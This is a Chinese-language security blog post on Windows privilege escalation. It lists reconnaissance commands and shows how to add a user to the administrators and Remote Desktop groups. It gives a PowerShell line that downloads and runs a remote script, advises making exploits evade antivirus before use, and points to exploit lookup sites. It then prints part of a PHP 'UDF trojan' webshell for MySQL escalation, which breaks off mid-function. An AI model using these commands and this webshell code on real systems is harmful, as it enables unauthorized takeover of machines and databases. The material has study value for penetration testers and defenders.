<!DOCTYPE html>

<html lang="zh-CN">

<head>
    
    <title>windows提权 - B1gd0g</title>
    <meta charset="UTF-8">
    <meta name="keywords" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    <link rel="shortcut icon" href="https://spring.io/images/favicon-9d25009f65637a49ac8d91eb1cf7b75e.ico" type="image/x-icon" />
    <meta name="description" content="提权基础（权限划分）Administrators：管理员组，默认情况下，Administrators中的用户对计算机&#x2F;域有不受限制的完全访问权。Power Users：高级用户组,Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。Users：普通用户组,这个组的用户无法进行有意或无意的改动。Guests：来宾组,来宾跟普通Users的成员有">
<meta property="og:type" content="article">
<meta property="og:title" content="windows提权">
<meta property="og:url" content="https://b1gd0g.github.io/2021/02/21/windows%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="B1gd0g">
<meta property="og:description" content="提权基础（权限划分）Administrators：管理员组，默认情况下，Administrators中的用户对计算机&#x2F;域有不受限制的完全访问权。Power Users：高级用户组,Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。Users：普通用户组,这个组的用户无法进行有意或无意的改动。Guests：来宾组,来宾跟普通Users的成员有">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235815.jpg">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235820.jpg">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235824.jpg">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235835.jpg">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235839.jpg">
<meta property="og:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235843.jpg">
<meta property="article:published_time" content="2021-02-20T17:07:34.000Z">
<meta property="article:modified_time" content="2022-09-30T03:25:56.884Z">
<meta property="article:author" content="B1gd0g">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/B1gd0g888/baipiaotuchang/raw/master/20220221235815.jpg">
    
<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1665474214470">
    
    <link rel="stylesheet" href="/css/style.css?v=1665474214470">

    
<meta name="generator" content="Hexo 5.3.0"></head>

<body class="mdui-drawer-body-left">
    <div id="nexmoe-background">
        <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210111542873.png)"></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="B1gd0g" class="mdui-btn mdui-btn-icon"><img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="B1gd0g">
            <img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g" alt="B1gd0g">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>15</div>
        <div><span>标签</span>12</div>
        <div><span>分类</span>2</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%AF%94.html" title="杀软对比">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                杀软对比
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E7%A4%BE%E5%B7%A5%E5%AF%86%E7%A0%81.html" title="社工密码">
            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
            <div class="mdui-list-item-content">
                社工密码
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E5%AF%BC%E8%88%AA.html" title="我的导航">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                我的导航
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                关于博主
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://cn.bing.com/search?q=" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>




    
        
        <!-- 一言 -->
<div class="nexmoe-widget-wrap">
  <h3 class="nexmoe-widget-title">
    一言
  </h3>
  <div class="nexmoe-widget">
    <ul class="hitokoto-box">
      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
        <a href="#" id="hitokoto_text">
          
        </a>
        <a href="#" id="hitokoto_error_text" style="display: none;">
          
        </a>
      </li>
    </ul>
  </div>
</div>

<script>
  let hitokotoText = document.getElementById('hitokoto_text')
  let hitokotoErroText = document.getElementById('hitokoto_error_text')
  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
  window.onload = function () {
    let url = 'https://v1.hitokoto.cn'
    if (hitokotoCategory) {
      url += '?c=' + hitokotoCategory
    }
    fetch(url)
      .then(response => response.json())
      .then(data => {
        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
      })
      .catch((reason) => {
        console.error(11, reason)
        hitokotoText.style.display = 'none'
        hitokotoErroText.style.display = 'block'
      })
  }
</script>
    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/tools/">tools</a>
          <span class="category-list-count">4</span>
        </li>

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/安全小记/">安全小记</a>
          <span class="category-list-count">10</span>
        </li>

        
      </ul>

    </div>
  </div>


    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/Html/" style="font-size: 10px;">Html</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 10px;">钓鱼</a>
    </div>
    
  </div>

    
        
</aside>
    <div class="nexmoe-copyright">
        &copy; 2022 B1gd0g
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer -->
    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
            <div class="nexmoe-post">

  <article>
    
        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
            <img src="https://img-blog.csdnimg.cn/20210526152513319.png" alt="windows提权" loading="lazy">
            <h1>windows提权</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2021年02月21日</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E5%AE%89%E5%85%A8%E5%B0%8F%E8%AE%B0/">安全小记</a>
        
        
    <a><i class="nexmoefont icon-areachart"></i>约4.9k字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要24分钟</a>

    </div>
    
    
    
    
    
</div>

    <h2 id="提权基础（权限划分）"><a href="#提权基础（权限划分）" class="headerlink" title="提权基础（权限划分）"></a>提权基础（权限划分）</h2><p>Administrators：管理员组，默认情况下，Administrators中的用户对计算机/域有不受限制的完全访问权。<br>Power Users：高级用户组,Power Users 可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。<br>Users：普通用户组,这个组的用户无法进行有意或无意的改动。<br>Guests：来宾组,来宾跟普通Users的成员有同等访问权，但来宾帐户的限制更多<br>Everyone：所有的用户，这个计算机上的所有用户都属于这个组。</p>
<a id="more"></a>



<h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ query user               <span class="hljs-comment"># 查看用户登陆情况</span><br>$ whoami                   <span class="hljs-comment"># 当前用户权限</span><br>$ <span class="hljs-built_in">set</span>                      <span class="hljs-comment"># 环境变量</span><br>$ hostname                 <span class="hljs-comment"># 主机名</span><br>$ systeminfo               <span class="hljs-comment"># 查看当前系统版本与补丁信息</span><br>$ ver                      <span class="hljs-comment"># 查看当前服务器操作系统版本</span><br>$ net user                 <span class="hljs-comment"># 查看用户信息</span><br>$ net start                <span class="hljs-comment"># 查看当前计算机开启服务名称</span><br>$ netstat -ano             <span class="hljs-comment"># 查看端口情况</span><br>$ netstat -ano|find <span class="hljs-string">&quot;3389&quot;</span> <span class="hljs-comment"># 查看指定端口</span><br>$ tasklist                 <span class="hljs-comment"># 查看所有进程占用的端口</span><br>$ taskkil /im xxx.exe /f   <span class="hljs-comment"># 强制结束指定进程</span><br>$ taskkil -PID pid号       <span class="hljs-comment"># 结束某个pid号的进程</span><br>$ tasklist /svc|find <span class="hljs-string">&quot;TermService&quot;</span> <span class="hljs-comment"># 查看服务pid号</span><br>$ wmic os get caption              <span class="hljs-comment"># 查看系统名</span><br>$ wmic product get name,version    <span class="hljs-comment"># 查看当前安装程序</span><br>$ wmic qfe get Description,HotFixID,InstalledOn <span class="hljs-comment"># 查看补丁信息</span><br>$ wmic qfe get Description,HotFixID,InstalledOn | findstr /C:<span class="hljs-string">&quot;KB4346084&quot;</span> /C:<span class="hljs-string">&quot;KB4509094&quot;</span> <span class="hljs-comment"># 定位特定补丁</span><br><br><span class="hljs-comment"># 添加管理员用户</span><br>$ net user username(用户名) password(密码) /add  <span class="hljs-comment"># 添加普通用户</span><br>$ net localgroup adminstrators username /add   <span class="hljs-comment"># 把普通用户添加到管理员用户组</span><br><span class="hljs-comment"># 如果远程桌面连接不上可以添加远程桌面组</span><br>$ net localgroup <span class="hljs-string">&quot;Remote Desktop Users&quot;</span> username /add<br></code></pre></td></tr></table></figure>


<h2 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h2><blockquote>
<p>系统漏洞漏洞提权一般就是利用系统自身缺陷，用来提升权限。通常利用<code>systeminfo</code>查看补丁记录，来判断有哪个补丁没打，然后使用相对应的exp进行提权。</p>
</blockquote>
<h3 id="查询补丁信息"><a href="#查询补丁信息" class="headerlink" title="查询补丁信息"></a>查询补丁信息</h3><ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/brianwrf/WinSystemHelper">WinSystemHelper</a>：检查可利用的漏洞。该工具适合在任何<strong>Windows</strong>服务器上进行已知提权漏洞的检测</p>
</li>
<li><ul>
<li>上传<code>WinSysHelper.bat</code>、<code>explt2003.txt</code>、<code>expgt2003.txt</code>，运行bat查看结果</li>
<li>然后在可利用的Exp中任意下载一个并执行即可</li>
</ul>
</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$ <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WinSysHelper</span>.</span></span>bat<br></code></pre></td></tr></table></figure>


<ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">Sherlock</a>：在Windows下用于本地提权的PowerShell脚本</p>
</li>
<li><ul>
<li>分析漏洞出漏洞后利用对应Exp即可</li>
</ul>
</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 启动Powershell</span><br><span class="hljs-variable">$</span> powershell.exe <span class="hljs-literal">-exec</span> bypass<br><br><span class="hljs-comment"># 本地加载脚本</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">Import-Module</span> Sherlock.ps1<br><br><span class="hljs-comment"># 远程加载脚本</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1&#x27;</span>)<br><br><span class="hljs-comment"># 检查漏洞，Vulnstatus为Appears Vulnerable即存在漏洞</span><br><span class="hljs-variable">$</span> <span class="hljs-built_in">Find-AllVulns</span><br></code></pre></td></tr></table></figure>


<ul>
<li><p>提权辅助平台</p>
</li>
<li><ul>
<li><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">漏洞编号查询</a>：根据补丁信息查找漏洞编号</li>
<li><a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/">Exp查询</a>：根据补丁信息查找Exp</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">Windows-Kernel-Exploits</a>：Windows平台提权漏洞集合</p>
</li>
</ul>
<h3 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h3><blockquote>
<p>除了需要注意每种漏洞所适用的详细系统版本及位数外，实战中还需要事先免杀并调试好Exp，否则可能有蓝屏等风险。</p>
</blockquote>
<ul>
<li> 先运行<code>systeminfo</code>，并将其中的修补程序内容复制到<a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/">提权辅助平台 - Exp查询</a>进行查询Exp。如：</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[<span class="hljs-symbol">01</span>]: <span class="hljs-link">KB2999226</span><br>[<span class="hljs-symbol">02</span>]: <span class="hljs-link">KB976902</span><br></code></pre></td></tr></table></figure>


<ul>
<li><p>然后根据可选补丁编号以及目标系统，选择对应的Exp下载运行即可。</p>
</li>
<li><p>另外还需要注意<strong>提权Exp的运行方式</strong>，一般有以下几种：</p>
</li>
<li><ul>
<li>直接执行exe程序，成功后会打开一个cmd窗口，在新窗口中权限就是<code>system</code></li>
<li>在WebShell中执行exe程序，执行方式为<code>xxx.exe whoami</code>，成功后直接执行命令，再修改命令内容，可以执行不同的命令</li>
<li>利用MSF等工具</li>
<li>C++源码，Python脚本，PowerShell脚本等特殊方式</li>
</ul>
</li>
</ul>
<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><ul>
<li><p>前提：拿到Root密码</p>
</li>
<li><p>注意：</p>
</li>
<li><ul>
<li>MySQL5.7以后<code>secure-file-priv</code>的问题</li>
<li>MySQL5.7后，系统的用户表<code>mysql.user</code>中的密码字段已从<code>password</code>修改为<code>authentication_string</code></li>
</ul>
</li>
</ul>
<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><ul>
<li><p>原理：通过root权限，导入<code>udf.dll</code>到系统目录下，可以通过<code>udf.dll</code>调用执行cmd</p>
</li>
<li><p>利用条件</p>
</li>
<li><ul>
<li>系统版本：Win2000、WinXP、Win2003</li>
<li>具有对MySQL的<code>insert/delete</code>权限的账号，用以创建和抛弃函数。最好是root，或具备root账号所具备的权限的其它账号。</li>
</ul>
</li>
</ul>
<h5 id="UDF木马提权"><a href="#UDF木马提权" class="headerlink" title="UDF木马提权"></a>UDF木马提权</h5><ul>
<li>已有Webshell的情况下可以直接上<a target="_blank" rel="noopener" href="https://github.com/gwjczwy/gwjczwy.github.io/blob/master/img/mysql%E6%8F%90%E6%9D%83/udf.php">UDF马</a></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]))<br>    <span class="hljs-variable">$action</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-keyword">else</span><br>    <span class="hljs-variable">$action</span> = <span class="hljs-string">&#x27;vConn&#x27;</span>;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$action</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;vConn&#x27;</span>:<br>        vConn();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;conn&#x27;</span>:<br>        conn();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;exec&#x27;</span>:<br>        execsql();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;install&#x27;</span>:<br>        install();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;copy&#x27;</span>:<br>        cp();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;cplug&#x27;</span>:<br>        cplug();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;logout&#x27;</span>:<br>        logout();<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;func&#x27;</span>:<br>        func();<br>        <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vConn</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;by ninty http://www.t00ls.net/&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;table&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;conn&quot;&gt;</span><br><span class="hljs-string">&lt;tr&gt;&lt;td&gt;ip:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;host&quot; value=&quot;localhost&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;uid:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; value=&quot;root&quot; name=&quot;uid&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;pwd:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;pwd&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;db:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;db&quot; value=&quot;mysql&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=&quot;submit&quot;/&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$conn</span> = conn(<span class="hljs-literal">false</span>);<br>    mysql_select_db(<span class="hljs-string">&#x27;mysql&#x27;</span>,<span class="hljs-variable">$conn</span>);<br>    mysql_query(<span class="hljs-string">&#x27;CREATE TABLE `func` ( `name` char(64) collate utf8_bin NOT NULL default \&#x27;\&#x27;, `ret` tinyint(1) NOT NULL default \&#x27;0\&#x27;, `dl` char(128) collate utf8_bin NOT NULL default \&#x27;\&#x27;, `type` enum(\&#x27;function\&#x27;,\&#x27;aggregate\&#x27;) character set utf8 NOT NULL, PRIMARY KEY (`name`) ) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=\&#x27;User defined functions\&#x27;&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (mysql_errno(<span class="hljs-variable">$conn</span>) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> mysql_error() . <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Create mysql.func success !&#x27;</span>;<br>    mysql_close(<span class="hljs-variable">$conn</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">conn</span>(<span class="hljs-params"><span class="hljs-variable">$close</span> = <span class="hljs-literal">true</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>        <span class="hljs-variable">$uid</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br>        <span class="hljs-variable">$pwd</span> = 